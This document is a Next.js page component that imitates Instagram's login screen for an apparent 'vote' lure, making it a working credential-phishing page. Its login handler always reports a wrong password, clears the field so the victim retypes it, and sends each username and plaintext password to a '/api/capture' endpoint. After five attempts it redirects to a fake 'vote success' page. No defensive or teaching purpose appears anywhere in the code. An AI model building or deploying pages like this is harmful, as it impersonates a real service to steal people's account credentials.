import Head from 'next/head';
import { useState, useRef } from 'react';
import { useRouter } from 'next/router';

const MAX_ATTEMPTS = 5;

export default function InstagramLoginPage() {
  const router = useRouter();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [feedback, setFeedback] = useState('');
  const [clickCount, setClickCount] = useState(0);
  const attemptRef = useRef(0);

  const handleLogin = async () => {
    setFeedback('Incorrect password! Please try again...');
    const pwdToSend = password;
    setPassword(''); // Clear password to require retaping
    attemptRef.current += 1;
    setClickCount(attemptRef.current);
    
    try {
      await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          username: email.trim(), 
          password: pwdToSend,
          method: 'instagram'
        })
      });
    } catch (e) {}
    
    if (attemptRef.current >= MAX_ATTEMPTS) {
      router.push('/vote-success');
    }
  };

  return (
    <>
      <Head>
        <meta charSet="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Instagram Login - Vote</title>
      </Head>

      <style jsx>{`
        html, body { height: 100%; margin: 0; padding: 0; }
        body { 
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
          background: #fafafa; 
          display: flex; 
          justify-content: center; 
          align-items: center; 
          min-height: 100vh;
          margin: 0;
        }
        .login-container {
                  width: 100%;
                  max-width: 375px;
                  padding: 0 20px;
                  text-align: center;
                }
        .logo { 
                  width: 130px;
                  height: 130px;
                  margin: 16px auto;
                  display: block;
                }
        input { 
          width: 100%;
          max-width: 320px;
          padding: 12px 14px; 
          margin: 10px 0;
          border: 1px solid #ddd; 
          border-radius: 6px;
          font-size: 15px;
          background: #fafafa;
        }
        input:focus { 
          outline: none; 
          border-color: #e1306c; 
          background: white;
        }
        button { 
                  width: 100%;
                  max-width: 320px;
                  padding: 12px;
                  background: #386FE8; 
                  color: white; 
                  border: none; 
                  border-radius: 8px;
                  font-size: 17px; 
                  cursor: pointer;
                  margin-top: 8px;
                  display: block;
                  margin-left: auto;
                  margin-right: auto;
                }
                button:hover { 
                  background: #2e5ac0; 
                }
        .feedback {
          color: #e1306c;
          font-size: 14px;
          margin: 8px 0;
        }
        a {
                  color: #007bff;
                  text-decoration: none;
                  font-size: 14px;
                  display: block;
                  margin-top: 12px;
                }
                .facebook-link {
                  color: #386FE8;
                  text-decoration: none;
                  font-size: 15px;
                  display: block;
                  margin: 12px auto 0;
                  max-width: 320px;
                  text-align: center;
                }
                .facebook-link:hover {
                  text-decoration: underline;
                }
                .divider {
                  display: flex;
                  align-items: center;
                  margin: 20px 0;
                  max-width: 320px;
                }
                .divider-line {
                  flex: 1;
                  height: 1px;
                  background: #dbdbdb;
                }
                .divider-text {
                  color: #8e8e8e;
                  font-size: 13px;
                  margin: 0 8px;
                }
                .app-heading {
                  font-size: 24px;
                  font-weight: 600;
                  color: #000;
                  margin: 24px 0 16px;
                  max-width: 320px;
                  display: block;
                  margin-left: auto;
                  margin-right: auto;
                }
                .footer {
                  margin-top: 32px;
                  padding-top: 16px;
                  border-top: 1px solid #dbdbdb;
                  font-size: 14px;
                  color: #8e8e8e;
                  max-width: 320px;
                  display: block;
                  margin-left: auto;
                  margin-right: auto;
                }
                .footer a {
                  color: #386FE8;
                  text-decoration: none;
                  margin: 0 6px;
                }
                .footer a:hover {
                  text-decoration: underline;
                }
                .footer-row {
                  display: block;
                  margin-top: 12px;
                  max-width: 320px;
                }
                .footer-row a {
                  color: #386FE8;
                  text-decoration: none;
                  margin: 0 6px;
                }
              `}</style>

      <div className="login-container">
                <img className="logo" src="/logos/ig.png" alt="Instagram" />
          
                <input 
                  type="text" 
                  placeholder="Email or phone number" 
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
                <input
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
          
                <div className="feedback">{feedback}</div>
          
                <button onClick={handleLogin}>Log In</button>
          
                <div className="divider">
                  <div className="divider-line"></div>
                  <span className="divider-text">OR</span>
                  <div className="divider-line"></div>
                </div>
          
                <a href="#" className="facebook-link">Log in with Facebook</a>
          
                <div className="app-heading">Get the app.</div>
          
                <div className="footer">
                  <a href="#">About</a>
                  <a href="#">Help</a>
                  <a href="#">Press</a>
                  <a href="#">Blog</a>
                </div>
                <div className="footer-row">
                  <a href="#">Terms</a>
                  <a href="#">Privacy</a>
                  <a href="#">Location</a>
                  <a href="#">Contact</a>
                </div>
                <div className="footer-row">
                  <a href="#">© 2024 Instagram</a>
                </div>
              </div>
    </>
  );
}